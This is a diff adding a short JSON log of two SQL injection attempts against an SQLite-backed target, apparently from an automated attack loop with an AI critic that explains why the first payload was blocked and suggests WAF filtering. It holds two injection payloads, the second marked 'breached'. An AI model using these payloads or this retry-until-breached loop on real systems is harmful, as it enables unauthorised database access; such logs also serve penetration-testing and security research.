@@ -1,0 +1,18 @@
+[
+    {
+        "attempt_number": 1,
+        "vuln_type": "sqli",
+        "payload": " UNION SELECT sqlite_version(), null, null, null --",
+        "server_response_summary": "Status 200",
+        "gamma_critique": "The payload failed to breach the SQLi vulnerability because it is likely being filtered by a SQL injection protection mechanism, such as a WAF (Web Application Firewall), which is blocking the UNION operator and the comment (--). This is further supported by the fact that the payload is being executed, as indicated by the response code 200 and the presence of the \"status\": \"fail\" message in the response body.",
+        "outcome": "failed"
+    },
+    {
+        "attempt_number": 2,
+        "vuln_type": "sqli",
+        "payload": "`' OR sqlite_version() LIKE '3%' --`",
+        "server_response_summary": "200",
+        "gamma_critique": "N/A",
+        "outcome": "breached"
+    }
+]
